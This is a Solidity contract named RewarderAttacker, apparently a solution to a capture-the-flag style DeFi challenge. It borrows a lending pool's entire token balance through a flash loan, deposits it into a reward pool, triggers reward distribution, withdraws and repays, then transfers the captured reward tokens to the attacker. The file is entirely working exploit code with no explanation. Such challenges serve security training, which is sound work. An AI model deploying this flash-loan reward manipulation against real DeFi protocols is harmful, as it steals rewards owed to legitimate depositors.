// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IFlashPool {
    function flashLoan(uint256 amount) external;
}

interface IRewardPool {
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
    function distributeRewards() external returns (uint256);
}

contract RewarderAttacker {

    address private attacker;
    IERC20 private immutable liquidityToken;
    IERC20 private immutable rewardToken;
    IFlashPool private immutable lendingPool;
    IRewardPool private immutable rewardPool;

    constructor(
        address _rewardPoolAddress,
        address _lendingPoolAddress,
        address _liquidityTokenAddress,
        address _rewardTokenAddress
        )
        {
            attacker = msg.sender;
            liquidityToken = IERC20(_liquidityTokenAddress);
            rewardToken = IERC20 (_rewardTokenAddress);
            lendingPool = IFlashPool (_lendingPoolAddress);
            rewardPool = IRewardPool(_rewardPoolAddress);
        }
        function attack() external {
            uint balance = liquidityToken.balanceOf(address(lendingPool));
            lendingPool.flashLoan(balance);

        }
        function receiveFlashLoan(uint256 amount) public {
            liquidityToken.approve(address(rewardPool), amount);
            rewardPool.deposit(amount);
            rewardPool.distributeRewards();
            rewardPool.withdraw(amount);
            liquidityToken.transfer(address(lendingPool), amount);
            uint tokens = rewardToken.balanceOf(address(this));
            rewardToken.transfer(attacker, tokens);
        }
}